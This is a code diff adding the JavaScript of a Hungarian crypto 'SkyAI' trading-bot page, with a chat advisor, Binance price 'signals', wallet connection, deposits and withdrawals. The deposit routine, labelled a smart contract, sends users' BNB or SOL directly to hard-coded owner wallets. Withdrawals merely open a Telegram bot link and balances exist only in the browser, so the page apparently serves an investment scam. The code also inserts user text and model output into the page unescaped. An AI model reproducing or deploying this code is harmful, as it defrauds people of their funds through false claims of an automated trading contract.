+
+        // --- AI CHAT ADVISOR ---
+
+        function toggleAiModal(show) { document.getElementById('aiModal').style.display = show ? 'flex' : 'none'; }
+
+
+
+        async function sendAiMessage() {
+
+            const input = document.getElementById('aiInput');
+
+            const content = document.getElementById('aiChatContent');
+
+            const userText = input.value.trim();
+
+            if (!userText) return;
+
+
+
+            content.innerHTML += `<div class="ai-message user">${userText}</div>`;
+
+            input.value = '';
+
+            content.scrollTop = content.scrollHeight;
+
+
+
+            const loadingId = 'loading-' + Date.now();
+
+            content.innerHTML += `<div class="ai-message bot" id="${loadingId}"><span class="loading-dots">SkyAI gépel</span></div>`;
+
+            content.scrollTop = content.scrollHeight;
+
+
+
+            const prompt = `Te vagy a SkyAI kereskedési asszisztens. Segítőkész, professzionális és tömör vagy. Válaszolj a felhasználó kérdésére magyarul: "${userText}"`;
+
+            const responseText = await callGemini(prompt);
+
+           
+
+            document.getElementById(loadingId).remove();
+
+            content.innerHTML += `<div class="ai-message bot">${marked.parse(responseText)}</div>`;
+
+            content.scrollTop = content.scrollHeight;
+
+        }
+
+
+
+        // --- REAL BINANCE API ---
+
+        async function fetchBinanceData() {
+
+            try {
+
+                const pairs = ["BTCUSDT", "BNBUSDT", "SOLUSDC"];
+
+                const response = await fetch("https://api.binance.com/api/v3/ticker/24hr");
+
+                const allData = await response.json();
+
+                const filtered = allData.filter(d => pairs.includes(d.symbol));
+
+                globalMarketData = [];
+
+                const tbody = document.getElementById('live-signals-body');
+
+                tbody.innerHTML = "";
+
+
+
+                filtered.forEach(item => {
+
+                    const price = parseFloat(item.lastPrice).toFixed(2);
+
+                    const change = parseFloat(item.priceChangePercent).toFixed(2);
+
+                    globalMarketData.push({ symbol: item.symbol, price: price, change: change });
+
+                    let signal = "NEUTRÁLIS", color = "#888";
+
+                    if (parseFloat(change) > 1.5) { signal = "ERŐS VÉTEL 🟢"; color = "var(--success)"; }
+
+                    else if (parseFloat(change) > 0.5) { signal = "VÉTEL"; color = "var(--success)"; }
+
+                    else if (parseFloat(change) < -1.5) { signal = "ERŐS ELADÁS 🔴"; color = "var(--danger)"; }
+
+                    else if (parseFloat(change) < -0.5) { signal = "ELADÁS"; color = "var(--danger)"; }
+
+
+
+                    const row = `<tr class="market-row"><td style="font-weight:bold; color:#fff;">${item.symbol.replace('USDC','/USDC').replace('USDT','/USDT')}</td><td>$${price}</td><td style="color:${parseFloat(change)>=0 ? 'var(--success)' : 'var(--danger)'}">${change}%</td><td style="font-weight:bold; color:${color}">${signal}</td></tr>`;
+
+                    tbody.innerHTML += row;
+
+                });
+
+            } catch (err) {
+
+                console.error("API Error:", err);
+
+                document.getElementById('live-signals-body').innerHTML = "<tr><td colspan='4'>Hiba a Binance adatkapcsolatban.</td></tr>";
+
+            }
+
+        }
+
+       
+
+        // --- NAVIGATION & WALLET ---
+
+        function nav(id) {
+
+            document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
+
+            document.getElementById(id).classList.add('active');
+
+            document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('active'));
+
+            const btn = Array.from(document.querySelectorAll('.menu-item')).find(b => b.getAttribute('onclick').includes(id));
+
+            if(btn) btn.classList.add('active');
+
+
+
+            const brand = document.getElementById('brand');
+
+            if(id === 'whale') {
+
+                brand.classList.add('whale-mode');
+
+                loadWhaleChart();
+
+                createWidget('tv-whale-btc', 'BINANCE:BTCUSDC', '60', 'active');
+
+            } else {
+
+                brand.classList.remove('whale-mode');
+
+            }
+
+            if(id === 'sniper') loadSniperChart();
+
+            if(id === 'markets') {
+
+                createWidget('tv-btc-main', 'BINANCE:BTCUSDC', '60', 'main');
+
+                createWidget('tv-sol-main', 'BINANCE:SOLUSDC', '60', 'main');
+
+            }
+
+        }
+
+
+
+        function openModal() { document.getElementById('walletModal').style.display='flex'; }
+
+
+
+        async function connectWallet(type) {
+
+            document.getElementById('walletModal').style.display='none';
+
+            const btn = document.getElementById('connectBtn');
+
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Loading...';
+
+            try {
+
+                if(type === 'SOL' && window.solana) {
+
+                    const r = await window.solana.connect();
+
+                    userAddress = r.publicKey.toString();
+
+                    walletType = 'SOL';
+
+                    activeCurrency = 'SOL';
+
+                } else if (type === 'BSC' && window.ethereum) {
+
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+
+                    await provider.send("eth_requestAccounts", []);
+
+                    signer = provider.getSigner();
+
+                    userAddress = await signer.getAddress();
+
+                    walletType = 'BSC';
+
+                    activeCurrency = 'BNB';
+
+                } else { throw "Wallet not found"; }
+
+                btn.innerHTML = `<i class="fas fa-user-check"></i> ${userAddress.slice(0,4)}...`;
+
+                btn.classList.add('connected');
+
+            } catch(e) {
+
+                alert("Hiba: " + e);
+
+                btn.innerHTML = '<i class="fas fa-wallet"></i> CONNECT';
+
+            }
+
+        }
+
+
+
+        // --- SNIPER LOGIC ---
+
+        function setSniperAsset(asset) {
+
+            document.getElementById('sniper-asset').value = asset;
+
+            document.getElementById('opt-sol').classList.remove('active');
+
+            document.getElementById('opt-bnb').classList.remove('active');
+
+            document.getElementById('opt-' + asset.toLowerCase()).classList.add('active');
+
+            loadSniperChart();
+
+        }
+
+
+
+        // --- LOGIC: DEPOSIT ---
+
+        async function startStrategy(mode) {
+
+            if(!walletType) { alert("Kérlek csatlakoztasd a tárcádat!"); openModal(); return; }
+
+            const amountId = mode === 'sniper' ? 'sniper-amount' : 'whale-amount';
+
+            const val = parseFloat(document.getElementById(amountId).value);
+
+            if(!val || val <= 0) { alert("Kérlek adj meg érvényes összeget!"); return; }
+
+
+
+            const approxUsd = activeCurrency === 'BNB' ? val * 600 : val * 200;
+
+            if(mode === 'sniper' && approxUsd > 100) { alert("⚠️ LIMIT FIGYELMEZTETÉS!\nA Sniper bot csak $100 alatti tőkéhez ajánlott.\nÁtirányítás a Whale Vault-hoz..."); nav('whale'); return; }
+
+            if(mode === 'whale' && approxUsd < 100) { alert("⚠️ MINIMUM TŐKE!\nA Whale Vault használatához minimum $100 szükséges.\nHasználd a Sniper botot."); nav('sniper'); return; }
+
+
+
+            if(!confirm(`SKYAI SMART CONTRACT\n\nTranzakció indítása: ${val} ${activeCurrency}\nCél: ${mode === 'sniper' ? 'Sniper Bot' : 'Whale Vault'}\n\nJóváhagyod?`)) return;
+
+
+
+            try {
+
+                if(walletType === 'BSC') {
+
+                    await signer.sendTransaction({ to: OWNER_BSC, value: ethers.utils.parseEther(val.toString()) });
+
+                } else {
+
+                    const tx = new solanaWeb3.Transaction().add(
+
+                        solanaWeb3.SystemProgram.transfer({
+
+                            fromPubkey: window.solana.publicKey,
+
+                            toPubkey: new solanaWeb3.PublicKey(OWNER_SOL),
+
+                            lamports: val * solanaWeb3.LAMPORTS_PER_SOL
+
+                        })
+
+                    );
+
+                    await window.solana.signAndSendTransaction(tx);
+
+                }
+
+                alert("✅ SIKERES BEFIZETÉS!\nA Bot automatikusan elindult és figyeli a piacot.");
+
+                activeInvestments[mode] += val;
+
+                document.getElementById(`${mode}-balance`).innerText = activeInvestments[mode].toFixed(4) + " " + activeCurrency;
+
+            } catch(e) { console.error(e); alert("Tranzakció elutasítva vagy hiba történt."); }
+
+        }
+
+
+
+        // --- LOGIC: WITHDRAW ---
+
+        function requestWithdrawal(mode) {
+
+            const amount = activeInvestments[mode];
+
+            if(amount <= 0) return;
+
+            const safeAmount = amount.toFixed(4);
+
+            const payload = `withdraw_${safeAmount}_${userAddress}_${activeCurrency}`;
+
+            const tgUrl = `https://t.me/${BOT_USERNAME}?start=${payload}`;
+
+            window.open(tgUrl, '_blank');
+
+        }
+
+
+
+        // --- CHARTS & TABS ---
+
+        function toggleWhaleChart(view) {
+
+            document.getElementById('tv-whale-active').style.display = view === 'active' ? 'block' : 'none';
+
+            document.getElementById('tv-whale-btc').style.display = view === 'btc' ? 'block' : 'none';
+
+        }
+
+
+
+        function loadSniperChart() {
+
+            if(document.getElementById('tv-sniper-active').innerHTML && document.getElementById('tv-sniper-active').getAttribute('data-symbol') === document.getElementById('sniper-asset').value) return;
+
+            const asset = document.getElementById('sniper-asset').value === 'SOL' ? 'BINANCE:SOLUSDC' : 'BINANCE:BNBUSDC';
+
+            document.getElementById('tv-sniper-active').setAttribute('data-symbol', document.getElementById('sniper-asset').value);
+
+            document.getElementById('tv-sniper-active').innerHTML = '';
+
+            createWidget('tv-sniper-active', asset, '15', 'dark');
+
+        }
+
+
+
+        function loadWhaleChart() {
+
+            const sym = document.getElementById('whale-pair').value;
+
+            document.getElementById('tv-whale-active').innerHTML = '';
+
+            createWidget('tv-whale-active', sym, '60', 'dark');
+
+        }
+
+
+
+        function createWidget(id, sym, interval, theme) {
+
+            new TradingView.widget({
+
+                "autosize": true, "symbol": sym, "interval": interval,
+
+                "timezone": "Europe/Budapest", "theme": "dark", "style": "1",
+
+                "locale": "hu_HU", "toolbar_bg": "#f1f3f6", "enable_publishing": false,
+
+                "hide_top_toolbar": true, "save_image": false,
+
+                "container_id": id, "backgroundColor": "rgba(11, 11, 15, 1)"
+
+            });
+
+        }
+
+    </script>
+
+</body>
+
+</html>
